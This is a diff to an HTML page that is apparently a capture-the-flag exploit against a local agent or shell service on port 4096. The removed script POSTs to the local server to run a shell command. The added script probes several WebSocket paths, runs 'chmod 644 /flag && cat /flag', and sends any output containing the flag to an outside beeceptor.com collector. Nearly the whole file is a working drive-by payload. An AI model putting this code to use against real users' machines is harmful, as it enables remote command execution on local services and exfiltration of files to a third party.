@@ -1,21 +1,55 @@
 <!DOCTYPE html>
 <html>
+<head>
+    <title>OpenShell WS Exploit</title>
+</head>
 <body>
-<script>
-// Malicious website JavaScript
-fetch('http://127.0.0.1:4096/session', {
-  method: 'POST',
-  headers: {'Content-Type': 'application/json'},
-  body: '{}'
-})
-.then(r => r.json())
-.then(session => {
-  fetch(`http://127.0.0.1:4096/session/${session.id}/shell`, {
-    method: 'POST',
-    headers: {'Content-Type': 'application/json'},
-    body: JSON.stringify({agent: 'build', command: 'id > /tmp/pwned.txt'})
-  });
-});
-</script>
+    <h1>Exploiting via WebSocket...</h1>
+    <script>
+        // 替换为你的收集地址
+        const EXFIL = "1233334.free.beeceptor.com/?data=";
+        const TARGET = "127.0.0.1";
+        const PORT = 4096;
+
+        // 常见 WebSocket 路径
+        const PATHS = ["/ws", "/shell", "/exec", "/tty", "/session/ws", "/api/ws"];
+
+        // 命令：修改权限并读取 flag
+        const CMD = "chmod 644 /flag && cat /flag";
+
+        async function tryPath(path) {
+            return new Promise((resolve) => {
+                const ws = new WebSocket(`ws://${TARGET}:${PORT}${path}`);
+                let timeout = setTimeout(() => {
+                    ws.close();
+                    resolve(false);
+                }, 2000);
+
+                ws.onopen = () => {
+                    clearTimeout(timeout);
+                    ws.send(CMD);
+                };
+
+                ws.onmessage = (e) => {
+                    if (e.data.includes("flag{")) {
+                        fetch(EXFIL + encodeURIComponent(e.data));
+                        ws.close();
+                        resolve(true);
+                    }
+                };
+
+                ws.onerror = () => {
+                    clearTimeout(timeout);
+                    resolve(false);
+                };
+            });
+        }
+
+        (async () => {
+            for (let p of PATHS) {
+                if (await tryPath(p)) break;
+            }
+        })();
+    </script>
 </body>
 </html>
